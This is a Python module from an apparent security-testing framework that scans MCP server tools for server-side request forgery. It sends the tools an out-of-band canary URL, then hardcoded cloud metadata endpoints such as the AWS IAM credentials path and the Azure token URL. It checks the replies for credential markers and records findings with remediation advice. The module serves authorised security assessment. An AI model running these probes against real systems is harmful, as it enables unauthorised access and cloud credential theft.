"""
Server-Side Request Forgery (SSRF) against MCP tools.

Targets tools that accept a URL/URI argument and ask the server to
reach it. Uses Minerva's OOB canary service for confirmation, and also
probes well-known cloud-metadata endpoints to demonstrate impact.
"""

import time as _time


def execute(target, params, context):
    rb = evidence.ReportBuilder(
        attack_id=context.get("attack_id", "ssrf"),
        target=target,
    )
    timeout = int(params.get("timeout", 30))
    oob_wait = int(params.get("oob_wait_seconds", 20))
    only_tool_names = params.get("only_tool_names") or []
    probe_cloud_metadata = bool(params.get("probe_cloud_metadata", True))

    mcp = mcp_client.MCPClient.from_target(target, timeout=timeout)
    try:
        disc = mcp.discover()
        if not disc["initialized"]:
            errs = disc.get("errors") or []
            detail = errs[0] if errs else {}
            init_resp = (disc.get("raw") or {}).get("initialize") or {}
            rb.error(
                f"MCP initialize failed. step={detail.get('step','init')} "
                f"status={init_resp.get('status')} "
                f"transport={init_resp.get('transport')} "
                f"error={detail.get('error') or init_resp.get('error')} "
                f"target_base_url={target.get('base_url')}")
            rb.add_evidence(evidence.ev_mcp_call(
                init_resp, note="failed initialize"))
            return rb.finalize(success=False)
        tools = disc.get("tools") or []
        cands = _pick_url_tools(tools, only_tool_names)
        if not cands:
            rb.warn("No URL-accepting tools found. Set only_tool_names to force.")
            return rb.finalize(success=True)
        rb.info(f"Candidate URL-tools: {[t.get('name') for t in cands]}")

        for tool in cands:
            tname = tool.get("name")
            schema = tool.get("inputSchema") or {}
            url_params = _url_params(schema)

            for pname in url_params:
                # ----- 1. OOB confirmation -----
                token = oob.mint(attack_id="ssrf", ttl=oob_wait + 20,
                                 metadata={"tool": tname, "param": pname})
                args = _fill_defaults(schema)
                args[pname] = token.url
                r = mcp.call_tool_safe(tname, args)
                rb.add_evidence(evidence.ev_mcp_call(
                    r, note=f"ssrf oob probe {tname}[{pname}]"))
                hits = oob.wait(token.token, timeout=oob_wait)
                if hits:
                    rb.add_finding(evidence.Finding(
                        attack_id=context.get("attack_id", "ssrf"),
                        title=f"SSRF CONFIRMED on '{tname}' via parameter '{pname}'",
                        category="ssrf",
                        severity="high",
                        confidence="confirmed",
                        cwe="CWE-918",
                        tool=tname, parameter=pname, payload=token.url,
                        description=(
                            f"The target's tool fetched the Minerva canary URL "
                            f"from source IP {hits[0].get('source_ip')}, "
                            "confirming the server performs outbound HTTP on "
                            "attacker-controlled URLs."
                        ),
                        impact=(
                            "Attacker can reach internal services (database "
                            "admin panels, cloud metadata endpoints, "
                            "file:// schemes) that are not exposed to the "
                            "public internet. In cloud environments this "
                            "commonly yields IAM credential theft."
                        ),
                        remediation=(
                            "Validate URLs against an allow-list of hostnames, "
                            "block private IPs (RFC1918, link-local, loopback), "
                            "block file://, gopher://, dict:// schemes, "
                            "and forbid DNS rebinding by resolving once and "
                            "checking the IP before fetching."
                        ),
                        references=[
                            "https://cwe.mitre.org/data/definitions/918.html",
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                        ],
                        evidence=[
                            evidence.ev_oob_hit(token.token, hits,
                                                note="OOB proof of SSRF"),
                            evidence.ev_mcp_call(r, note="response to SSRF payload"),
                        ],
                    ))
                oob.release(token.token)

                # ----- 2. Cloud metadata probes (impact demo) -----
                if not probe_cloud_metadata:
                    continue
                for cloud, cloud_url in _CLOUD_METADATA:
                    args = _fill_defaults(schema)
                    args[pname] = cloud_url
                    r = mcp.call_tool_safe(tname, args)
                    text = (r.get("text_output") or "").lower()
                    if _cloud_indicator(cloud, text):
                        rb.add_finding(evidence.Finding(
                            attack_id=context.get("attack_id", "ssrf"),
                            title=f"SSRF to {cloud} metadata on '{tname}'",
                            category="ssrf",
                            severity="critical",
                            confidence="high",
                            cwe="CWE-918",
                            tool=tname, parameter=pname, payload=cloud_url,
                            description=(
                                f"The tool response to {cloud_url} contains "
                                f"{cloud}-specific metadata markers. This is "
                                "typically enough to steal short-lived cloud "
                                "credentials."
                            ),
                            remediation=(
                                "Block 169.254.169.254 and metadata.google.internal "
                                "at the egress layer (e.g. IMDSv2-only on AWS, "
                                "GKE Workload Identity, Azure MSI with tightened "
                                "scopes)."
                            ),
                            evidence=[evidence.ev_mcp_call(r)],
                        ))
        return rb.finalize()
    finally:
        mcp.close()


_URL_KEYWORDS = ("url", "uri", "link", "endpoint", "address", "src",
                 "source", "href", "webhook", "callback", "fetch")

_CLOUD_METADATA = [
    ("aws",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws",   "http://169.254.169.254/latest/meta-data/"),
    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/"),
    ("azure", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"),
]


def _cloud_indicator(cloud, text):
    if cloud == "aws":
        return "accesskeyid" in text or "instance-id" in text or "ami-" in text
    if cloud == "gcp":
        return "computemetadata" in text or "service-accounts" in text
    if cloud == "azure":
        return "access_token" in text and "expires_in" in text
    return False


def _pick_url_tools(tools, force):
    if force:
        return [t for t in tools if t.get("name") in set(force)]
    out = []
    for t in tools:
        blob = f"{t.get('name','')} {t.get('description','')}".lower()
        if any(k in blob for k in _URL_KEYWORDS):
            out.append(t)
    if out:
        return out
    # Fallback: tools with a param whose name hints URL
    for t in tools:
        for n in (t.get("inputSchema") or {}).get("properties", {}) or {}:
            if any(k in n.lower() for k in _URL_KEYWORDS):
                out.append(t); break
    return out


def _url_params(schema):
    out = []
    for n, s in ((schema or {}).get("properties") or {}).items():
        if not isinstance(s, dict) or s.get("type") != "string":
            continue
        if any(k in n.lower() for k in _URL_KEYWORDS):
            out.append(n)
        elif (s.get("format") or "").lower() in ("uri", "url"):
            out.append(n)
    return out


def _fill_defaults(schema):
    out = {}
    props = (schema or {}).get("properties") or {}
    for n in ((schema or {}).get("required") or []):
        t = ((props.get(n) or {}).get("type"))
        out[n] = {"string": "http://example.com/", "integer": 1, "number": 1,
                  "boolean": False, "array": [], "object": {}}.get(t, "")
    return out
